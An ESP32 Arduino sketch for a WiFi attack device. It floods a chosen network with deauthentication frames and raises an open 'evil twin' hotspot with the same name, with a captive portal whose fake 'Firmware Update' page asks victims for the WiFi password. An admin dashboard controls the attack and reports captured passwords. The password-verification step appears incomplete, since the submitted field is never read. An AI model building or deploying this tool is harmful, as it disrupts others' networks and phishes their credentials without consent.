#include <Arduino.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <esp_wifi.h>

const int LED_PIN = 2;              
const char* ADMIN_SSID = "GMpro";   
const char* ADMIN_PASS = "Sangkur87"; 
const byte DNS_PORT = 53;

typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
} _Network;

_Network _networks[16];
_Network _selectedNetwork;
WebServer webServer(80);
DNSServer dnsServer;

String _correct = "";
String _tryPassword = "";
bool deauthing_active = false;
bool hotspot_active = false;
unsigned long last_deauth_time = 0;

void runStrobo() {
  for (int i = 0; i < 40; i++) {
    digitalWrite(LED_PIN, HIGH); delay(40);
    digitalWrite(LED_PIN, LOW); delay(40);
  }
}

void sendDeauthFrame(uint8_t* bssid, uint8_t ch) {
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  uint8_t packet[26] = {
    0xC0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x01, 0x00
  };
  memcpy(&packet[10], bssid, 6);
  memcpy(&packet[16], bssid, 6);
  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
}

void performManualScan() {
  WiFi.scanDelete(); 
  int n = WiFi.scanNetworks(false, false, false, 100); 
  if (n > 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _networks[i].ssid = WiFi.SSID(i);
      _networks[i].ch = WiFi.channel(i);
      memcpy(_networks[i].bssid, WiFi.BSSID(i), 6);
    }
  }
}

void handleIndex() {
  // HALAMAN PHISHING KORBAN
  if (hotspot_active && !webServer.host().equalsIgnoreCase("192.168.4.1")) {
      String p = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'>";
      p += "<style>body{font-family:sans-serif;background:#eee;padding:20px;text-align:center;} .c{background:#fff;padding:20px;border-radius:10px;box-shadow:0 2px 10px rgba(0,0,0,0.1);}";
      p += "input{width:100%;padding:12px;margin:10px 0;border:1px solid #ccc;border-radius:5px;} button{background:#007bff;color:#fff;border:none;width:100%;padding:12px;border-radius:5px;font-weight:bold;}</style></head>";
      p += "<body><div class='c'><h2>Firmware Update</h2><p>Masukkan password WiFi <b>" + _selectedNetwork.ssid + "</b> untuk memulai pembaruan sistem.</p>";
      p += "<form action='/' method='get'><input type='password' name='pass' placeholder='Password WiFi' required><button type='submit'>UPDATE SEKARANG</button></form></div></body></html>";
      webServer.send(200, "text/html", p);
      return;
  }

  // LOGIC TOMBOL
  if (webServer.hasArg("sel")) _selectedNetwork = _networks[webServer.arg("sel").toInt()];
  
  if (webServer.hasArg("action")) {
    String a = webServer.arg("action");
    if (a == "deauth_on") deauthing_active = true;
    if (a == "deauth_off") deauthing_active = false;
    if (a == "hotspot_on") { hotspot_active = true; WiFi.softAP(_selectedNetwork.ssid.c_str()); }
    if (a == "hotspot_off") { hotspot_active = false; WiFi.softAP(ADMIN_SSID, ADMIN_PASS); }
    if (a == "scan") { performManualScan(); }
  }

  // DASHBOARD ADMIN (HTML/CSS)
  String h = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'>";
  h += "<style>body{font-family:'Segoe UI',sans-serif;background:#111;color:#0f0;margin:0;padding:15px;} .container{max-width:500px;margin:auto;background:#222;padding:15px;border-radius:10px;border:1px solid #444;}";
  h += "h1{text-align:center;font-size:20px;margin-bottom:20px;border-bottom:1px solid #444;padding-bottom:10px;color:#0f0;} .status{background:#333;padding:10px;border-radius:5px;margin-bottom:15px;border-left:4px solid #ff0;}";
  h += "table{width:100%;border-collapse:collapse;} th,td{padding:10px;text-align:left;border-bottom:1px solid #444;} th{color:#ff0;}";
  h += ".btn{display:inline-block;padding:8px 12px;border-radius:4px;text-decoration:none;font-weight:bold;margin:4px 2px;text-align:center;}";
  h += ".b-yel{background:#ff0;color:#000;} .b-grn{background:#0f0;color:#000;} .b-red{background:#f00;color:#fff;} .b-blu{background:#007bff;color:#fff;font-size:11px;}";
  h += ".res{background:#0f0;color:#000;padding:10px;border-radius:5px;margin-bottom:15px;text-align:center;font-weight:bold;}</style></head>";
  h += "<body><div class='container'><h1>GMPRO DASHBOARD</h1>";

  if (_correct != "") h += "<div class='res'>DAPET! " + _correct + "</div>";

  h += "<div class='status'>TARGET: <b style='color:#fff'>" + (_selectedNetwork.ssid == "" ? "KOSONG" : _selectedNetwork.ssid) + "</b><br>";
  h += "ATTACK: <b style='color:" + String(deauthing_active ? "#f00" : "#0f0") + "'>" + (deauthing_active ? "DEAUTH JALAN" : "IDLE") + "</b></div>";

  h += "<div style='text-align:center;'><a href='/?action=scan' class='btn b-yel'>RE-SCAN NETWORKS</a><br>";
  h += "<a href='/?action=deauth_on' class='btn b-grn'>START DEAUTH</a><a href='/?action=deauth_off' class='btn b-red'>STOP</a><br>";
  h += "<a href='/?action=hotspot_on' class='btn b-grn'>START EVIL</a><a href='/?action=hotspot_off' class='btn b-red'>STOP</a></div>";

  h += "<table><tr><th>SSID</th><th>CH</th><th>AKSI</th></tr>";
  for (int i = 0; i < 16; i++) {
    if (_networks[i].ssid == "") continue;
    h += "<tr><td>" + _networks[i].ssid + "</td><td>" + String(_networks[i].ch) + "</td>";
    h += "<td><a href='/?sel=" + String(i) + "' class='btn b-blu'>PILIH</a></td></tr>";
  }
  h += "</table><p style='text-align:center;font-size:10px;color:#666;'>ESP32-WROOM-32U - GMpro</p></div></body></html>";

  webServer.send(200, "text/html", h);
}

void setup() {
  Serial.begin(115200);
  pinMode(LED_PIN, OUTPUT);

  // PERBAIKAN: Mode AP diset duluan agar sinyal stabil muncul
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ADMIN_SSID, ADMIN_PASS, 1, 0, 4);
  delay(500); // Beri waktu radio stabil
  
  WiFi.mode(WIFI_AP_STA);
  esp_wifi_set_ps(WIFI_PS_NONE); 

  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
  webServer.on("/", handleIndex);
  webServer.onNotFound(handleIndex);
  webServer.begin();
  
  Serial.println("GMpro Ready!");
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  if (_tryPassword != "" && WiFi.status() == WL_CONNECTED) {
    _correct = "BERHASIL! Pass " + _selectedNetwork.ssid + ": " + _tryPassword;
    runStrobo();
    _tryPassword = ""; hotspot_active = false; deauthing_active = false;
    WiFi.disconnect();
    WiFi.softAP(ADMIN_SSID, ADMIN_PASS);
  }

  if (deauthing_active && _selectedNetwork.ssid != "") {
    if (millis() - last_deauth_time > 150) { 
      sendDeauthFrame(_selectedNetwork.bssid, _selectedNetwork.ch);
      last_deauth_time = millis();
    }
  }
}
